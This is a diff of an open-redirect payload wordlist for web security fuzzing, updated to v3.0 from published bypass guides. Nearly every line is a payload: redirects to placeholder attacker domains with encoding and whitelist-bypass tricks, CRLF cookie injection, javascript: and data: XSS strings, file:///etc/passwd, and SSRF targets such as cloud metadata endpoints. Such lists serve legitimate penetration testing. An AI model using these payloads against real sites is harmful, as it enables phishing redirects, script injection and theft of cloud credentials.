@@ -1,254 +1,487 @@
 # ============================================================================
-# Open Redirect Payloads Wordlist - v2.0
+# Open Redirect Payloads Wordlist - v3.0
 # Comprehensive payload list based on:
 # - ElMahdi's 7 Open Redirect Bypass Techniques
 # - Intigriti's Advanced Open Redirect Guide
 # - PortSwigger URL Validation Bypass Cheat Sheet
 # - 0xblackbird's Open Redirect Bypasses
+# - DivertoMenu's Complete Open Redirect Filter Bypass Guide
 # ============================================================================
 
 # ============================================================================
-# [0x01] Simple Domain Change
+# [0x01] Common Detection Parameters
 # ============================================================================
+?url=https://attacker.com
+?next=https://attacker.com
+?redirect=https://attacker.com
+?redirect_uri=https://attacker.com
+?redirect_url=https://attacker.com
+/redirect/https://attacker.com
+?return=https://attacker.com
+?return_url=https://attacker.com
+?target=https://attacker.com
+?continue=https://attacker.com
+?go=https://attacker.com
+
+# ============================================================================
+# [0x02] XSS Testing
+# ============================================================================
+?url=javascript:console.log(1)
+?url=javascript:alert(1)
+?url=javascript:prompt(1)
+?redirect=javascript:alert(document.domain)
+?next=javascript:void(alert(1))
+
+# ============================================================================
+# [0x03] CRLF Injection
+# ============================================================================
+?url=/%0D%0ASet-Cookie:mycookie=myvalue
+?url=/%0ASet-Cookie:admin=true
+?url=/%0DSet-Cookie:session=hijacked
+?redirect=/%0D%0ALocation:https://attacker.com
+
+# ============================================================================
+# [0x04] Backslash-Forward Slash Mix (WHATWG vs RFC3986)
+# ============================================================================
+https://%65%78%61%6D%70%6C%65%2E%63%6F%6D
+https:////attacker.com
+https:///attacker.com
 https://attacker.com
-https://evil.com
-https://malicious.com
-https://phishing.com
-https://steal-data.com
-https://redirect-me.com
-https://bypass-filter.com
-http://attacker.com
-http://evil.com
-http://malicious.com
-
-# ============================================================================
-# [0x02] Bypass - Protocol Blacklist using //
-# ============================================================================
-//attacker.com
-//evil.com
-//malicious.com
-//phishing.com
-//steal-data.com
-//redirect-me.com
-//bypass-filter.com
-//google.com
-//github.com
-//facebook.com
-
-# ============================================================================
-# [0x03] Bypass - Double Slash Blacklist using \
-# ============================================================================
-\attacker.com
-\evil.com
-\malicious.com
-\phishing.com
-\steal-data.com
-\redirect-me.com
-\bypass-filter.com
-\google.com
-\github.com
-\facebook.com
-
-# ============================================================================
-# [0x04] Bypass - Protocol Blacklist using http: or https:
-# ============================================================================
-http:attacker.com
-http:evil.com
-http:malicious.com
+https:/attacker.com
 https:attacker.com
-https:evil.com
-https:malicious.com
-http:google.com
-https:google.com
-http:github.com
-https:github.com
-
-# ============================================================================
-# [0x05] Bypass - Using %40 (@ symbol)
-# ============================================================================
-example.com%40attacker.com
-example.com%40evil.com
-google.com%40attacker.com
-github.com%40attacker.com
-facebook.com%40attacker.com
-attacker.com%40example.com
-evil.com%40example.com
-malicious.com%40google.com
-phishing.com%40github.com
-steal-data.com%40facebook.com
-
-# ============================================================================
-# [0x06] Bypass - Domain Name Check (no protocol validation)
-# ============================================================================
-example.comattacker.com
-example.comevil.com
-example.commodalicious.com
-google.comattacker.com
-github.comattacker.com
-facebook.comattacker.com
-attacker.comexample.com
-evil.comexample.com
-malicious.comgoogle.com
-phishing.comgithub.com
-
-# ============================================================================
-# [0x07] Bypass - Domain Name Check using %2e (encoded dot)
-# ============================================================================
-example.com%2eattacker.com
-example.com%2eevil.com
-example.com%2emalicious.com
-google.com%2eattacker.com
-github.com%2eattacker.com
-facebook.com%2eattacker.com
-attacker.com%2eexample.com
-evil.com%2eexample.com
-malicious.com%2egoogle.com
-phishing.com%2egithub.com
-
-# ============================================================================
-# [0x08] Bypass - Domain Check using Query Mark ?
-# ============================================================================
-attacker.com?example.com
-evil.com?example.com
-malicious.com?example.com
-phishing.com?google.com
-steal-data.com?github.com
-redirect-me.com?facebook.com
-bypass-filter.com?twitter.com
-attacker.com?redirect=example.com
-evil.com?redirect=google.com
-malicious.com?redirect=github.com
-
-# ============================================================================
-# [0x09] Bypass - Domain Check using Hash %23
-# ============================================================================
-attacker.com%23example.com
-evil.com%23example.com
-malicious.com%23example.com
-phishing.com%23google.com
-steal-data.com%23github.com
-redirect-me.com%23facebook.com
-bypass-filter.com%23twitter.com
-attacker.com%23redirect=example.com
-evil.com%23redirect=google.com
-malicious.com%23redirect=github.com
-
-# ============================================================================
-# [0x10] Bypass - Using ° (degree symbol)
-# ============================================================================
-example.com/°attacker.com
-example.com/°evil.com
-example.com/°malicious.com
-google.com/°attacker.com
-github.com/°attacker.com
-facebook.com/°attacker.com
-attacker.com/°example.com
-evil.com/°example.com
-malicious.com/°google.com
-phishing.com/°github.com
-
-# ============================================================================
-# [0x11] Bypass - URL Encoded Chinese Dot %E3%80%82
-# ============================================================================
-attacker.com%E3%80%82example.com
-evil.com%E3%80%82example.com
-malicious.com%E3%80%82example.com
-phishing.com%E3%80%82google.com
-steal-data.com%E3%80%82github.com
-redirect-me.com%E3%80%82facebook.com
-bypass-filter.com%E3%80%82twitter.com
-attacker.com%E3%80%82%23example.com
-evil.com%E3%80%82%23example.com
-malicious.com%E3%80%82%23google.com
-
-# ============================================================================
-# [0x12] Bypass - Path Control using Nullbyte %0d
-# ============================================================================
-/%0d/attacker.com
-/%0d/evil.com
-/%0d/malicious.com
-/%0d/google.com
-/%0d/github.com
-/%0d/facebook.com
-/%0d%0d/attacker.com
-/%0d%0d/evil.com
-/%0d/attacker.com%23example.com
-
-# ============================================================================
-# [0x13] Bypass - Path Control using Newline %0a
-# ============================================================================
-/%0a/attacker.com
-/%0a/evil.com
-/%0a/malicious.com
-/%0a/google.com
-/%0a/github.com
-/%0a/facebook.com
-/%0a%0a/attacker.com
-/%0a%0a/evil.com
-/%0a/attacker.com%23example.com
-
-# ============================================================================
-# [0x14] Bypass HTTP Scheme Blacklist
-# ============================================================================
-//attacker.com
-///attacker.com
+https:\attacker.com
+https:\\attacker.com
+https:\\\attacker.com
+https:\\\\attacker.com
+https:/\/\attacker.com
+https:\/\/attacker.com
+https://\\attacker.com
+https:\\//attacker.com
+https:///\attacker.com
+https:\///attacker.com
+https:/\\\attacker.com
+https:\\\/attacker.com
+https:/\/attacker.com
+https:\/\attacker.com
+https://\attacker.com
+https:\\/attacker.com
+https:/\\attacker.com
+https:\//attacker.com
+https:/\attacker.com
+https:\/attacker.com
 ////attacker.com
+///attacker.com
+//attacker.com
+/attacker.com
+attacker.com
+\attacker.com
+\\attacker.com
+\\\attacker.com
+\\\\attacker.com
+/\/\attacker.com
+\/\/attacker.com
+//\\attacker.com
+\\//attacker.com
+///\attacker.com
+\///attacker.com
+/\\\attacker.com
+\\\/attacker.com
+/\/attacker.com
+\/\attacker.com
+//\attacker.com
+\\/attacker.com
+/\\attacker.com
+\//attacker.com
+/\attacker.com
+\/attacker.com
+
+# ============================================================================
+# [0x05] Special Characters - Control Characters
+# ============================================================================
+%01https://attacker.com
+%02https://attacker.com
+%03https://attacker.com
+%04https://attacker.com
+%05https://attacker.com
+%06https://attacker.com
+%07https://attacker.com
+%08https://attacker.com
+%09https://attacker.com
+%0Ahttps://attacker.com
+%0Bhttps://attacker.com
+%0Chttps://attacker.com
+%0Dhttps://attacker.com
+%0Ehttps://attacker.com
+%0Fhttps://attacker.com
+%10https://attacker.com
+%11https://attacker.com
+%12https://attacker.com
+%13https://attacker.com
+%14https://attacker.com
+%15https://attacker.com
+%16https://attacker.com
+%17https://attacker.com
+%18https://attacker.com
+%19https://attacker.com
+%1Ahttps://attacker.com
+%1Bhttps://attacker.com
+%1Chttps://attacker.com
+%1Dhttps://attacker.com
+%1Ehttps://attacker.com
+%1Fhttps://attacker.com
+%20https://attacker.com
+
+# ============================================================================
+# [0x06] Special Characters - Tab, Newline, Carriage Return
+# ============================================================================
+h%09ttps://attacker.com
+h%0Attps://attacker.com
+h%0Dttps://attacker.com
+https%09://attacker.com
+https%0A://attacker.com
+https%0D://attacker.com
+%09https%09://attacker.com
+%0Ahttps%0A://attacker.com
+%0Dhttps%0D://attacker.com
+%23attacker.com
+https:%40attacker.com
+%40attacker.com
+https://%09attacker.com/
+https://%0Aattacker.com/
+https://%0Dattacker.com/
+https://%0D%0Aattacker.com/
+%0D%0A//attacker.com
+%0D%0A\\attacker.com
+/%09/attacker.com
 /%0A/attacker.com
 /%0D/attacker.com
-/%09/attacker.com
-/+/attacker.com
-\\attacker.com
-\\\\attacker.com
+/%0D%0A/attacker.com
+\%09\attacker.com
+\%0A\attacker.com
+\%0D\attacker.com
+\%0D%0A\attacker.com
 
 # ============================================================================
-# [0x15] Bypass URI Authority Component (//) Blacklist
+# [0x07] Double URL Encoding
 # ============================================================================
-http:attacker.com
-https:attacker.com
-http:evil.com
-https:evil.com
-http:malicious.com
-https:malicious.com
-http:/attacker.com
-https:/attacker.com
-http:\\attacker.com
-https:\\attacker.com
+%2540attacker.com
+%2509attacker.com
+%250Aattacker.com
+%250Dattacker.com
+%250A%250Dattacker.com
+%252F%252Fattacker.com
+%252f%252fattacker.com
+%2525252fattacker.com
 
 # ============================================================================
-# [0x16] Bypass Weak Domain Validation
+# [0x08] Whitelist Bypass - Domain as Prefix (Add TLD)
 # ============================================================================
-https://attacker.com@example.com
-https://example.com@attacker.com
-https://google.com@attacker.com
-https://github.com@attacker.com
-https://attacker.com.example.com
-https://example.com.attacker.com
-https://google.com.attacker.com
-https://github.com.attacker.com
-https://attacker.com/example.com
-https://attacker.com/google.com
-https://attacker.com/github.com
-https://attacker.com?example.com
-https://attacker.com?google.com
-https://attacker.com?github.com
+https://example.com.attacker.com/
+https://example.com;.attacker.com/
+https://example.com\;.attacker.com/
+https://example.com%23attacker.com/
 
 # ============================================================================
-# [0x17] Bypass Weak TLD Validation
+# [0x09] Whitelist Bypass - @ Symbol Injection
 # ============================================================================
-https://example.comattacker.com
-https://google.comattacker.com
-https://github.comattacker.com
-https://example.com.mx
-https://google.com.mx
-https://example.com.company
-https://google.com.company
-https://github.com.company
-https://attacker.com%E3%80%82example.com
-https://attacker.com%E3%80%82google.com
-https://attacker.com%E3%80%82github.com
+%40example.com%40attacker.com
+https://%40example.com%40attacker.com/
+https://example.com%40attacker.com/
+https://example.com;%40attacker.com/
+https://example.com\;%40attacker.com/
+https://example.com\%40%40attacker.com/
+https://example.com:%40attacker.com/
+https://example.com:anything%40attacker.com/
+https://example.com%26%40attacker.com/
+https://example.com%26anything%40attacker.com/
+https://example.com%5B%40attacker.com/
+https://example.com:443%23\%40attacker.com/
+https://example.com?%40attacker.com/
+https://example.com%20%26%40attacker.com#%20%40attacker.com/
 
 # ============================================================================
-# [0x18] ElMahdi - Path-URI Open Redirect
+# [0x10] Whitelist Bypass - Concatenation
+# ============================================================================
+https://example.comattacker.com/
+
+# ============================================================================
+# [0x11] Whitelist Bypass - Domain as Suffix (Prefix Modification)
+# ============================================================================
+https://evilexample.com/
+https://evil-example.com/
+https://evil_example.com/
+
+# ============================================================================
+# [0x12] Whitelist Bypass - Domain as Suffix (Subdomain Injection)
+# ============================================================================
+https://evil.example.com
+
+# ============================================================================
+# [0x13] Whitelist Bypass - Domain as Suffix (Erase Top Domain)
+# ============================================================================
+https://attacker.com%00example.com/
+https://attacker.com%20example.com/
+https://attacker.com%09example.com/
+https://attacker.com%0Aexample.com/
+https://attacker.com%0Dexample.com/
+https://attacker.com%0D%0Aexample.com/
+https://attacker.com%0D%0A%40example.com/
+https://attacker.com/example.com/
+https://attacker.com//example.com/
+https://attacker.com///example.com/
+https://attacker.com/.example.com/
+https://attacker.com\example.com/
+https://attacker.com\\example.com/
+https://attacker.com\\\example.com/
+https://attacker.com\.example.com/
+https://attacker.com%40example.com/
+https://attacker.com/%40example.com/
+https://attacker.com\%40example.com/
+https://attacker.com%20%40example.com/
+https://attacker.com%20%26%40example.com/
+https://attacker.com%26example.com/
+https://attacker.com%26%40example.com/
+https://attacker.com%23example.com/
+https://attacker.com%23%40example.com/
+https://attacker.com%23\%40example.com/
+https://attacker.com%3Fexample.com/
+https://attacker.com%3F%40example.com/
+https://attacker.com%3Fd=http://example.com/
+https://attacker.com%3Fd=example.com/
+https://attacker.com;https://example.com/
+
+# ============================================================================
+# [0x14] Whitelist Bypass - Unescaped Dot Regex
+# ============================================================================
+https://evilexample.com/
+https://evil-example.com/
+https://evil_example.com/
+
+# ============================================================================
+# [0x15] Path Traversal
+# ============================================================================
+https://example.com/path/../attacker.com
+https://example.com/path/..\attacker.com
+https://example.com/path/..\/attacker.com
+https://example.com/path/../\attacker.com
+https://example.com/path/....//attacker.com
+https://example.com/path/..;/attacker.com
+https://example.com/path/..%5cattacker.com
+https://example.com/path/..%2fattacker.com
+https://example.com/path/%2e%2e/attacker.com
+https://example.com/path/%2e%2e\attacker.com
+https://example.com/path/%2e%2e%2fattacker.com
+https://example.com/path/%2e%2e%5cattacker.com
+
+# ============================================================================
+# [0x16] Null Byte Bypass (Extension/Parameter Appending)
+# ============================================================================
+https://example.com/path/../attacker.com%00
+
+# ============================================================================
+# [0x17] Unicode Normalization - Alternative Dots
+# ============================================================================
+https://example%CB%91com/
+https://example%CB%99com/
+https://example%D5%9Fcom/
+https://example%D7%83com/
+https://example%D9%ABcom/
+https://example%DB%94com/
+https://example%E0%A5%B0com/
+https://example%E1%8D%A2com/
+https://example%E1%99%AEcom/
+https://example%E1%9B%ABcom/
+https://example%E1%9F%94com/
+https://example%E2%80%A4com/
+https://example%E2%80%A7com/
+https://example%E2%A0%A8com/
+https://example%E2%B8%B1com/
+https://example%E2%B8%B3com/
+https://example%EF%B9%92com/
+https://example%EF%BC%8Ecom/
+https://example%EF%BD%A1com/
+https://example%EF%BF%BDcom/
+
+# ============================================================================
+# [0x18] Unicode Normalization - Empty String Characters
+# ============================================================================
+https://%E2%80%8Bexample.com/
+https://%E2%81%A0example.com/
+https://%C2%ADexample.com/
+https://%CD%8Fexample.com/
+https://%E1%A0%8Bexample.com/
+https://%E1%A0%8Cexample.com/
+https://%E1%A0%8Dexample.com/
+https://%E1%A0%8Eexample.com/
+https://%E1%A0%8Fexample.com/
+https://%E2%81%A4example.com/
+
+# ============================================================================
+# [0x19] Unicode Normalization - Alternative Space Characters
+# ============================================================================
+%C2%A0https://example.com/
+%E1%8D%A1https://example.com/
+%E1%9A%80https://example.com/
+%E2%80%80https://example.com/
+%E2%80%81https://example.com/
+%E2%80%82https://example.com/
+%E2%80%83https://example.com/
+%E2%80%84https://example.com/
+%E2%80%85https://example.com/
+%E2%80%86https://example.com/
+%E2%80%87https://example.com/
+%E2%80%88https://example.com/
+%E2%80%89https://example.com/
+%E2%80%8Ahttps://example.com/
+%E2%80%A8https://example.com/
+%E2%80%A9https://example.com/
+%E2%80%AFhttps://example.com/
+%E2%81%9Fhttps://example.com/
+%E3%80%80https://example.com/
+
+# ============================================================================
+# [0x20] Unicode Normalization - Alternative @ Symbols
+# ============================================================================
+https://example.com%EF%B9%ABattacker.com/
+https://example.com%EF%BC%A0attacker.com/
+
+# ============================================================================
+# [0x21] Unicode Normalization - Alternative Hashtag
+# ============================================================================
+https://example.com%EF%B9%9Fattacker.com/
+https://example.com%EF%BC%83attacker.com/
+
+# ============================================================================
+# [0x22] Unicode Normalization - Alternative Ampersand
+# ============================================================================
+https://example.com%EF%BC%86attacker.com/
+https://example.com%EF%B9%A0attacker.com/
+
+# ============================================================================
+# [0x23] Unicode Normalization - Alternative Colon
+# ============================================================================
+https://example.com%EF%BC%9Aattacker.com/
+https://example.com%EF%B9%95attacker.com/
+https://example.com%EF%B8%93attacker.com/
+https://example.com%EF%B8%99attacker.com/
+https://example.com%EF%B8%B0attacker.com/
+
+# ============================================================================
+# [0x24] Unicode Normalization - Alternative Question Mark
+# ============================================================================
+https://example.com%EF%BC%9Fattacker.com/
+https://example.com%EF%B8%96attacker.com/
+
+# ============================================================================
+# [0x25] Unicode Normalization - Alternative Slash
+# ============================================================================
+https://example.com%E2%88%95attacker.com/
+https://example.com%E2%95%B1attacker.com/
+https://example.com%EF%BC%8Fattacker.com/
+
+# ============================================================================
+# [0x26] Unicode Normalization - Alternative Backslash
+# ============================================================================
+https://example.com%EF%BC%BCattacker.com/
+https://example.com%EF%B9%A8attacker.com/
+
+# ============================================================================
+# [0x27] Browser Domain Parsing - Generic (Safari, Chrome, Mozilla)
+# ============================================================================
+https://example.com.-.attacker.com/
+https://example.com._.attacker.com/
+
+# ============================================================================
+# [0x28] Browser Domain Parsing - Safari Only
+# ============================================================================
+https://example.com.,.attacker.com/
+https://example.com.;.attacker.com/
+https://example.com.!.attacker.com/
+https://example.com.'.attacker.com/
+https://example.com.".attacker.com/
+https://example.com.(.attacker.com/
+https://example.com.).attacker.com/
+https://example.com.{.attacker.com/
+https://example.com.}.attacker.com/
+https://example.com.*.attacker.com/
+https://example.com.&.attacker.com/
+https://example.com.`.attacker.com/
+https://example.com.+.attacker.com/
+https://example.com.=.attacker.com/
+https://example.com.~.attacker.com/
+https://example.com.$.attacker.com/
+
+# ============================================================================
+# [0x29] Browser Domain Parsing - Mozilla Only
+# ============================================================================
+https://example.com.+.attacker.com/
+https://example.com.$.attacker.com/
+
+# ============================================================================
+# [0x30] JavaScript Filter Evasion - Basic
+# ============================================================================
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:alert("XSS")
+javascript:confirm(1)
+javascript:prompt(1)
+javascript:void(0)
+javascript:void(alert(1))
+javascript:window.location='https://attacker.com'
+javascript:document.location='https://attacker.com'
+
+# ============================================================================
+# [0x31] JavaScript Filter Evasion - Case Variation
+# ============================================================================
+JavaScript:alert(1)
+JAVASCRIPT:alert(1)
+jAvAsCrIpT:alert(1)
+JaVaScRiPt:alert(1)
+
+# ============================================================================
+# [0x32] JavaScript Filter Evasion - Whitespace
+# ============================================================================
+ja%20vascri%20pt:alert(1)
+ja%0avascri%0apt:alert(1)
+ja%0dvascri%0dpt:alert(1)
+ja%09vascri%09pt:alert(1)
+jav%20ascri%20pt:alert(1)
+jav%0aascri%0apt:alert(1)
+jav%0dascri%0dpt:alert(1)
+jav%09ascri%09pt:alert(1)
+
+# ============================================================================
+# [0x33] JavaScript Filter Evasion - Advanced
+# ============================================================================
+%01jA%0Ava%09scr%09ipT%0D:prompt(document.domain)
+%0AjAva%0d%0ascr%09ipT%0d%0a:prompt(document.domain)
+%09jAv%09ascr%09ipT:prompt(document.domain)
+%19javascript:alert(1)
+javascript://%0Aalert(1)
+javascript://%0Dalert(1)
+javascript://https://example.com%0Aalert(1)
+javascript:/**/alert(1)
+javascript://*/alert(1)
+javascript://%5Calert(1)
+
+# ============================================================================
+# [0x34] JavaScript Filter Evasion - Other Bypasses
+# ============================================================================
+//javascript:prompt(1)
+/\javascript:prompt(1)
+\\javascript:prompt(1)
+/%0A/javascript:prompt(1)
+/%09/javascript:prompt(1)
+/%0A/javascript:prompt(1)
+\%09\javascript:prompt(1)
+\%0A\javascript:prompt(1)
+%0D%0A//javascript:prompt(1)
+%0D%0A\\javascript:prompt(1)
+javascript://something%0aalert(1)
+javascript://something%250aalert(1)
+
+# ============================================================================
+# [0x35] ElMahdi - Path-URI Open Redirect
 # ============================================================================
 //mahdi.com/
 //attacker.com/
@@ -256,11 +489,9 @@ https://attacker.com%E3%80%82github.com
 /mahdi.com/
 /attacker.com/
 /malicious.com/
-//evil.com/path
-//phishing.com/callback
 
 # ============================================================================
-# [0x19] ElMahdi - %09 Tab Character Bypass
+# [0x36] ElMahdi - %09 Tab Character Bypass
 # ============================================================================
 https://example.com%09.attacker.com
 https://google.com%09.attacker.com
@@ -268,11 +499,9 @@ https://github.com%09.attacker.com
 https://attacker.com%09.example.com
 https://attacker.com%09.google.com
 https://attacker.com%09.github.com
-https://evil.com%09.malicious.com
-https://phishing.com%09.steal-data.com
 
 # ============================================================================
-# [0x20] ElMahdi - Double Encode %252E Bypass
+# [0x37] ElMahdi - Double Encode %252E Bypass
 # ============================================================================
 https://example.com%252e.attacker.com
 https://google.com%252e.attacker.com
@@ -280,11 +509,9 @@ https://github.com%252e.attacker.com
 https://attacker.com%252e.example.com
 https://attacker.com%252e.google.com
 https://attacker.com%252e.github.com
-https://evil.com%252e.malicious.com
-https://phishing.com%252e.steal-data.com
 
 # ============================================================================
-# [0x21] ElMahdi - %5B Square Bracket Bypass
+# [0x38] ElMahdi - %5B Square Bracket Bypass
 # ============================================================================
 https://attacker.com[.example.com
 https://attacker.com[.google.com
@@ -292,11 +519,9 @@ https://attacker.com[.github.com
 https://example.com[.attacker.com
 https://google.com[.attacker.com
 https://github.com[.attacker.com
-https://evil.com[.malicious.com
-https://phishing.com[.steal-data.com
 
 # ============================================================================
-# [0x22] ElMahdi - Special Characters Safari Bypass
+# [0x39] ElMahdi - Special Characters Safari Bypass
 # ============================================================================
 https://www.example.com*.attacker.com
 https://www.google.com*.attacker.com
@@ -320,7 +545,7 @@ https://www.example.com!attacker.com
 https://www.google.com!attacker.com
 
 # ============================================================================
-# [0x23] ElMahdi - Whitelist Word Bypass
+# [0x40] ElMahdi - Whitelist Word Bypass
 # ============================================================================
 https://mahditwitterattacker.com
 https://attacker.comtwitter
@@ -328,267 +553,34 @@ https://attacker.comgoogle
 https://attacker.comfacebook
 https://attacker.comgithub
 https://attacker.comyoutube
-https://mahdigoogleattacker.com
-https://attacker.comlinkedin
 
 # ============================================================================
-# [0x24] JavaScript Protocol - Basic
-# ============================================================================
-javascript:alert(1)
-javascript:alert('XSS')
-javascript:alert("XSS")
-javascript:confirm(1)
-javascript:prompt(1)
-javascript:void(0)
-javascript:void(alert(1))
-javascript:window.location='https://attacker.com'
-javascript:document.location='https://attacker.com'
-
-# ============================================================================
-# [0x25] JavaScript Protocol - Case Variation
-# ============================================================================
-JavaScript:alert(1)
-JAVASCRIPT:alert(1)
-jAvAsCrIpT:alert(1)
-JaVaScRiPt:alert(1)
-JavaScriptAlert(1)
-
-# ============================================================================
-# [0x26] JavaScript Protocol - Whitespace Bypass
-# ============================================================================
-ja%20vascri%20pt:alert(1)
-ja%0avascri%0apt:alert(1)
-ja%0dvascri%0dpt:alert(1)
-ja%09vascri%09pt:alert(1)
-jav%20ascri%20pt:alert(1)
-jav%0aascri%0apt:alert(1)
-jav%0dascri%0dpt:alert(1)
-jav%09ascri%09pt:alert(1)
-
-# ============================================================================
-# [0x27] JavaScript Protocol - Advanced Bypass
-# ============================================================================
-%19javascript:alert(1)
-javascript://%0Aalert(1)
-javascript://%0Dalert(1)
-javascript://https://example.com%0Aalert(1)
-javascript:/**/alert(1)
-javascript://*/alert(1)
-javascript://%5Calert(1)
-
-# ============================================================================
-# [0x28] Data Protocol
+# [0x41] Data Protocol
 # ============================================================================
 data:text/html,<script>alert(1)</script>
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 data:text/html;charset=utf-8,<script>alert(1)</script>
 
 # ============================================================================
-# [0x29] VBScript Protocol
+# [0x42] VBScript Protocol
 # ============================================================================
 vbscript:msgbox(1)
 VBScript:msgbox(1)
 vbscript:alert(1)
 
 # ============================================================================
-# [0x30] Newline Injection (%0A, %0D)
+# [0x43] Alternative Protocol Schemes
 # ============================================================================
-https://attacker.com%0aset-cookie:admin=true
-https://attacker.com%0dset-cookie:admin=true
-https://attacker.com%0a%0dset-cookie:admin=true
-https://evil.com%0ainjection=payload
-https://malicious.com%0dinjection=payload
+ftp://attacker.com
+file:///etc/passwd
+file://attacker.com
+gopher://attacker.com
+telnet://attacker.com
+ldap://attacker.com
+jar:https://attacker.com
 
 # ============================================================================
-# [0x31] Null Byte Injection (%00)
-# ============================================================================
-https://example.com%00.attacker.com
-https://google.com%00.attacker.com
-https://github.com%00.attacker.com
-https://attacker.com%00example.com
-https://attacker.com%00google.com
-https://evil.com%00malicious.com
-https://phishing.com%00steal-data.com
-
-# ============================================================================
-# [0x32] Query Parameters as Domain Separator
-# ============================================================================
-https://example.com/?attacker.com
-https://google.com/?attacker.com
-https://github.com/?attacker.com
-https://example.com/?redirect=attacker.com
-https://google.com/?redirect=attacker.com
-https://evil.com/?next=malicious.com
-https://phishing.com/?return=steal-data.com
-
-# ============================================================================
-# [0x33] Fragment as Domain Separator
-# ============================================================================
-https://example.com/#attacker.com
-https://google.com/#attacker.com
-https://github.com/#attacker.com
-https://example.com/#redirect=attacker.com
-https://google.com/#redirect=attacker.com
-https://evil.com/#next=malicious.com
-https://phishing.com/#return=steal-data.com
-
-# ============================================================================
-# [0x34] Backslash-based Bypass
-# ============================================================================
-\\/attacker.com
-\\\\attacker.com
-\\\\\attacker.com
-\\\/attacker.com
-\\\\\\\\\attacker.com
-
-# ============================================================================
-# [0x35] Mixed Encoding - Double Slash
-# ============================================================================
-%2F%2Fattacker.com
-%2f%2fattacker.com
-%2F%2fgoogle.com
-%2f%2fgithub.com
-%252f%252fattacker.com
-
-# ============================================================================
-# [0x36] Mixed Encoding - Colon
-# ============================================================================
-https%3A%2F%2Fattacker.com
-https%3a%2f%2fattacker.com
-http%3A%2F%2Fattacker.com
-http%3a%2f%2fattacker.com
-
-# ============================================================================
-# [0x37] Mixed Encoding - At Symbol
-# ============================================================================
-https://example.com%40attacker.com
-https://google.com%40attacker.com
-https://github.com%40attacker.com
-https://attacker.com%40example.com
-
-# ============================================================================
-# [0x38] Mixed Encoding - Dot
-# ============================================================================
-https://example%2Ecom.attacker.com
-https://google%2Ecom.attacker.com
-https://github%2Ecom.attacker.com
-https://attacker%2Ecom.example.com
-
-# ============================================================================
-# [0x39] Unicode & Special Characters
-# ============================================================================
-https://attacker。com
-https://attacker。com/
-https://example。com
-https://google。com
-https://attacker。example。com
-
-# ============================================================================
-# [0x40] Port-based Bypasses
-# ============================================================================
-https://example.com:80@attacker.com
-https://example.com:443@attacker.com
-https://example.com:8080@attacker.com
-https://attacker.com:80/example.com
-https://attacker.com:443/example.com
-https://attacker.com:8080/example.com
-
-# ============================================================================
-# [0x41] Protocol-less Variations
-# ============================================================================
-//attacker.com:80
-//attacker.com:443
-//attacker.com:8080
-//attacker.com/path
-//attacker.com?param=value
-//attacker.com#fragment
-
-# ============================================================================
-# [0x42] Single Slash Variations
-# ============================================================================
-/attacker.com
-/google.com
-/github.com
-/example.com
-/facebook.com
-/youtube.com
-
-# ============================================================================
-# [0x43] Relative Path Variations
-# ============================================================================
-../attacker.com
-../../attacker.com
-../../../attacker.com
-....//attacker.com
-....\\attacker.com
-
-# ============================================================================
-# [0x44] Empty/Null Variations
-# ============================================================================
-
-null
-NULL
-None
-NONE
-undefined
-UNDEFINED
-
-# ============================================================================
-# [0x45] Common Whitelist Bypass - Google Services
-# ============================================================================
-https://accounts.google.com@attacker.com
-https://accounts.google.com.attacker.com
-https://accounts.google.com/attacker.com
-https://attacker.com/accounts.google.com
-https://attacker.com?accounts.google.com
-
-# ============================================================================
-# [0x46] Common Whitelist Bypass - Microsoft Services
-# ============================================================================
-https://login.microsoft.com@attacker.com
-https://login.microsoft.com.attacker.com
-https://login.microsoft.com/attacker.com
-https://attacker.com/login.microsoft.com
-https://attacker.com?login.microsoft.com
-
-# ============================================================================
-# [0x47] Common Whitelist Bypass - GitHub
-# ============================================================================
-https://github.com@attacker.com
-https://github.com.attacker.com
-https://github.com/attacker.com
-https://attacker.com/github.com
-https://attacker.com?github.com
-
-# ============================================================================
-# [0x48] Common Whitelist Bypass - Facebook
-# ============================================================================
-https://facebook.com@attacker.com
-https://facebook.com.attacker.com
-https://facebook.com/attacker.com
-https://attacker.com/facebook.com
-https://attacker.com?facebook.com
-
-# ============================================================================
-# [0x49] Common Whitelist Bypass - LinkedIn
-# ============================================================================
-https://linkedin.com@attacker.com
-https://linkedin.com.attacker.com
-https://linkedin.com/attacker.com
-https://attacker.com/linkedin.com
-https://attacker.com?linkedin.com
-
-# ============================================================================
-# [0x50] Common Whitelist Bypass - Twitter
-# ============================================================================
-https://twitter.com@attacker.com
-https://twitter.com.attacker.com
-https://twitter.com/attacker.com
-https://attacker.com/twitter.com
-https://attacker.com?twitter.com
-
-# ============================================================================
-# [0x51] OAuth Redirect URI Bypass
+# [0x44] OAuth Redirect URI Bypass
 # ============================================================================
 https://attacker.com
 https://attacker.com/callback
@@ -601,7 +593,7 @@ http://127.0.0.1:8080
 http://[::1]:8080
 
 # ============================================================================
-# [0x52] SSRF Chain - Localhost Variations
+# [0x45] SSRF Chain - Localhost
 # ============================================================================
 http://localhost
 http://127.0.0.1
@@ -613,16 +605,14 @@ http://localhost:8080
 http://127.0.0.1:8080
 
 # ============================================================================
-# [0x53] SSRF Chain - AWS Metadata
+# [0x46] SSRF Chain - AWS Metadata
 # ============================================================================
 http://169.254.169.254
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254:80
-http://metadata.google.internal
-http://metadata.google.internal/computeMetadata/v1/
 
 # ============================================================================
-# [0x54] SSRF Chain - Private Networks
+# [0x47] SSRF Chain - Private Networks
 # ============================================================================
 http://10.0.0.0
 http://172.16.0.0
@@ -635,7 +625,141 @@ http://172.31.255.255
 http://192.168.255.255
 
 # ============================================================================
-# [0x55] CSRF + Open Redirect Chain
+# [0x48] 0xblackbird - Simple Domain Change
+# ============================================================================
+https://attacker.com
+https://evil.com
+https://malicious.com
+https://phishing.com
+http://attacker.com
+http://evil.com
+http://malicious.com
+
+# ============================================================================
+# [0x49] 0xblackbird - Protocol Bypass
+# ============================================================================
+//attacker.com
+//evil.com
+//malicious.com
+\attacker.com
+\evil.com
+\malicious.com
+http:attacker.com
+https:attacker.com
+https:evil.com
+https:malicious.com
+
+# ============================================================================
+# [0x50] 0xblackbird - %40 Bypass
+# ============================================================================
+example.com%40attacker.com
+example.com%40evil.com
+google.com%40attacker.com
+github.com%40attacker.com
+
+# ============================================================================
+# [0x51] 0xblackbird - Domain Concatenation
+# ============================================================================
+example.comattacker.com
+example.comevil.com
+example.commodalicious.com
+google.comattacker.com
+github.comattacker.com
+
+# ============================================================================
